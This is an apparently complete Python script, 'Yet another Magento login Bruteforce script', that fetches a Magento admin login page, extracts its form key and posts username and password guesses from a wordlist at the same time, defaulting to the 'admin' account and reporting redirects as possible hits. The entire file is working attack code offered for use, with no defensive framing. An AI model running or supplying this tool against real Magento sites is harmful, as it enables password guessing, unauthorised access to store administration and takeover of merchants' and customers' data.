import re
import aiohttp
import asyncio
import argparse
import signal
import sys

desc = '''
  ___ ___                         __         
 |   Y   .---.-.-----.-----.-----|  |_.-----.
 |.      |  _  |  _  |  -__|     |   _|  _  |
 |. \_/  |___._|___  |_____|__|__|____|_____|
 |:  |   |     |_____|                       
 |::.|:. |                                   
 `--- ---'                                   
                                             
                        ┳┓       ┏┓         
                        ┣┫┏┓┓┏╋┏┓┣ ┏┓┏┓┏┏┓┏┓
                        ┻┛┛ ┗┻┗┗ ┻ ┗┛┛ ┗┗ ┛ 
                                by: Arale61

[!] Tested with:
    - Magento ver. dev-2.4-develop
    - python 3.11.4
[!] Doesn't stop at potential password found.
[!] Feel free to press ctrl+C to terminate.
'''

parser = argparse.ArgumentParser(description='Yet another Magento login Bruteforce script.')
parser.add_argument("-u", help="The username to try to brute force the password. Defaults to admin", default="admin")
parser.add_argument("-w", help="The password wordlist fullpath to use")
parser.add_argument("url", help="The url where the Magento login is located")


async def gen(wordlist):
    with open(wordlist, 'rt') as f:
        for i in f.readlines():
            yield i.strip()


async def do_request(url, username, password):
    hg = {"Origin": url, "Referer": url, "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}
    hp = {"Content-Type":"application/x-www-form-urlencoded", "Origin":url, "Referer":url, "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=hg) as response:
            t = await response.text()
            form_key = re.findall(r'(?=value)value=\"(?P<value>[^\"]+)', t)
            if form_key != None and len(form_key) == 1:
                form_key = form_key[0]
                data_str = f"form_key={form_key}&login%5Busername%5D={username}&login%5Bpassword%5D={password}"
                async with session.post(url, data=data_str, cookies=response.cookies, headers=hp, allow_redirects=False) as response:
                    t = await response.text()
                    c = response.status
                    if c == 200:
                        if "messages-message-error" in t:
                            print(f"[X] Bad {username}: {password}                     ", end="\r")
                    elif c == 302:
                        print(f"[V] To Check: {username}: {password}")


async def main(url, username, wordlist): 
    tasks = []
    try:
        print(desc)
        resume = f'''
[i] Preparing tasks to bruteforce:
    - Magento URL: {url}
    - username: {username}
    - wordlist: {wordlist}
        '''
        print(resume)
        print("")
        async for i in gen(wordlist):
            tasks.append(asyncio.create_task(do_request(url, username, i)))
        await asyncio.wait(tasks)
    except Exception as e:
        print(e)



if __name__ == "__main__":
    try:
        args = parser.parse_args()
        username = args.u
        wordlist = args.w
        url = args.url
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main(url, username, wordlist))
    except :
        pass
